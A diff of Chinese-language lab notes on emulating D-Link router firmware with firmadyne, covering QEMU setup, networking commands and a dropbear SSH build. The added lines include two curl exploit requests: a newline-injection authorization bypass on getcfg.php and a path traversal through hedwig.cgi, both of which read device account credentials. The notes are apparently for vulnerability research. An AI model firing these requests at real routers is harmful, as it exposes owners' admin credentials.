@@ -18,22 +18,30 @@ user: iot  password:attify
 >
 >/scratch/number,存储生成的一键运行脚本和image.raw。
 
+##### 使用流程
+
 ```
+#删除以前的image
 cd /home/iot/tools/firmware-analysis-toolkit
 ./reset.py
-cd  firmadyne/scratch/
-rm -rf *
-cd  ../images/
+
+#创建并启动firm
 sudo ./fat.py DIR-645_FIRMWARE_1.03.ZIP  --qemu 2.5.0
 sudo ./fat.py DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP
 #非初次启动
 ./firmadyne/scratch/1/run.sh
+#若失败
+#关闭qemu进程，删除tap网卡设备
+ps -aux|grep qemu
+tunctl -d name
 #645,850验证
 curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://192.168.0.1/getcfg.php"
+curl -d '<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>' -b "uid=demo" -H "Content-Type: text/xml" "http://VictimIp:8080/hedwig.cgi"
+
 ifconfig 
 sudo /home/iot/tools/firmware-analysis-toolkit/firmadyne/scripts/inferNetwork.sh '2' 'mipseb'
 
-
+#ip和tunctl命令
 sudo tunctl -d name
 ifconfig eth0 192.168.1.56 netmask 255.255.255.0 broadcast 192.168.1.255
 ip addr add 192.  dev wlan
@@ -52,66 +60,15 @@ ip route chg 10.0.0/24 dev dummy
 df -h
 fdisk -l
 fdisk  /dev/sda
-```
 
-```
-As of now, the ARM firmadyne kernel doesn't work with the latest version of Qemu (2.11.1) available on the Ubuntu 18.04 official repository. However, Qemu (2.5.0) on Ubuntu 16.04 does work. Alternatively you can also use the bundled Qemu (2.5.0) provided with firmadyne as shown in example 2.
-```
-
-
-
-**到web页面查看用户名密码**
-
-```
-admin,password
-```
-
-**dropbear**
-
-安装
-
-```
-下载
-tar xzf dropbear
-cd dropbear
-cat INSTALL
-./configure --prefix=/usr/local/dropbear/ --sysconfdir=/etc/dropbear/
-make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp"
-sudo make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp" install   
-```
-
-开启服务端
-
-```
-dropbear -E -p 222
+curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://192.168.0.1:8080/getcfg.php"
 ```
 
 
 
-连接服务端
 
-```
-sudo apt-get update -y
-sudo apt-get install dropbear -y
-sudo apt-get install libc6,zlib1g,openssh-client,runit,udev,xauth
-```
 
-```
-dbclient admin@192.168.0.100
-password
-
-/etc/init.d/dropbear restart
-```
-
-**dropbear的scp**
-
-```
-cd $dropbear_home
-./scp test.txt admin@router:/home
-password
-```
-
-run.sh
+##### run.sh
 
 ```
 #!/bin/bash
@@ -280,5 +237,50 @@ WHERE [condition];
 
 select * from tablename;
 
+**dropbear**
 
+安装
+
+```
+下载
+tar xzf dropbear
+cd dropbear
+cat INSTALL
+./configure --prefix=/usr/local/dropbear/ --sysconfdir=/etc/dropbear/
+make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp"
+sudo make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp" install   
+```
+
+开启服务端
+
+```
+dropbear -E -p 222
+```
+
+
+
+连接服务端
+
+```
+sudo apt-get update -y
+sudo apt-get install dropbear -y
+sudo apt-get install libc6,zlib1g,openssh-client,runit,udev,xauth
+```
+
+```
+dbclient admin@192.168.0.100
+password
+
+/etc/init.d/dropbear restart
+```
+
+**dropbear的scp**
+
+```
+cd $dropbear_home
+./scp test.txt admin@router:/home
+password
+```
+
+run.sh
 
